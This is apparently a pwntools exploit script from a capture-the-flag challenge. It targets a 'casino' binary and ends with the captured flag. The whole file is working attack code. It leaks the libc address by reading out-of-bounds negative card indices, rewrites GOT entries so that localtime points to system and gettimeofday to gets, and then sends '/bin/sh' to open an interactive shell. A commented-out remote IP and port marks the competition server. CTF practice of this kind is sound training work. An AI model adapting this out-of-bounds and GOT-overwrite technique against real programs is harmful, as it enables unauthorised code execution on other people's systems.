from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./casino_patched', '''
    continue
''')

# p = remote('20.84.72.194', 5004)

# Initialize the game
p.sendlineafter(b'Enter your name: ', b'\x00'*0x3f)
pause()

# Leak the libc base address
p.sendlineafter(b'Choose an option: ', b'1')
addr_arr = []
for i in range(12):
    p.sendlineafter(b'Choose an option: ', b'1')
    p.sendlineafter(b'Which card to view? ', str(-((0x40e8-0x4048)*2+5+i)).encode())
    half_byte = p.recvline().strip().split(b'(0x')[1].split(b')')[0].decode()
    addr_arr.append(half_byte)
    if i % 2 != 0:
        temp = addr_arr[-1]
        addr_arr[-1] = addr_arr[-2]
        addr_arr[-2] = temp
glibc_e = ELF('./libc.so.6')
glibc_base_addr = int(''.join(addr_arr), 16)-glibc_e.symbols['fgets']
log.info(f'glibc base address: {hex(glibc_base_addr)}')
p.sendlineafter(b'Choose an option: ', b'4')
pause()

# Overwrite the GOT table: localtime -> system
p.sendlineafter(b'Choose an option: ', b'1')
system_arr = list(hex(glibc_base_addr+glibc_e.symbols['system'])[2:])
for i in range(0, len(system_arr), 2):
    if i + 1 < len(system_arr):
        temp = system_arr[i]
        system_arr[i] = system_arr[i+1]
        system_arr[i+1] = temp
for i in range(12):
    while True:
        if i == 10:
            break
        p.sendlineafter(b'Choose an option: ', b'2')
        p.sendlineafter(b'Which card index to replace? ', str(-((0x40e8-0x4008)*2+5+i)).encode())
        half_byte = p.recvline().strip().split(b'(0x')[1].split(b')')[0].decode().lower()
        p.sendlineafter(b'Choose an option: ', b'4')
        p.sendlineafter(b'Choose an option: ', b'1')
        if half_byte == system_arr[i]:
            break
p.sendlineafter(b'Choose an option: ', b'4')
pause()

# Overwrite the GOT table: gettimeofday -> gets
p.sendlineafter(b'Choose an option: ', b'1')
gets_arr = list(hex(glibc_base_addr+glibc_e.symbols['gets'])[2:])
for i in range(0, len(gets_arr), 2):
    if i + 1 < len(gets_arr):
        temp = gets_arr[i]
        gets_arr[i] = gets_arr[i+1]
        gets_arr[i+1] = temp
for i in range(12):
    while True:
        if i == 10 or i == 8:
            break
        p.sendlineafter(b'Choose an option: ', b'2')
        p.sendlineafter(b'Which card index to replace? ', str(-((0x40e8-0x4030)*2+5+i)).encode())
        half_byte = p.recvline().strip().split(b'(0x')[1].split(b')')[0].decode().lower()
        p.sendlineafter(b'Choose an option: ', b'4')
        p.sendlineafter(b'Choose an option: ', b'1')
        if half_byte == gets_arr[i]:
            break
p.sendlineafter(b'Choose an option: ', b'4')
pause()

# Pop a shell
p.sendlineafter(b'Choose an option: ', b'3')
p.recvuntil(b'Thanks for playing at the Squ1rrel Casino!\n')
p.sendline(b'/bin/sh\x00')

p.interactive()

# squ1rrel{80%_0f_4ll_g4mbl3rs_qu1t_b3f0r3_th31r_b1g_pwn!}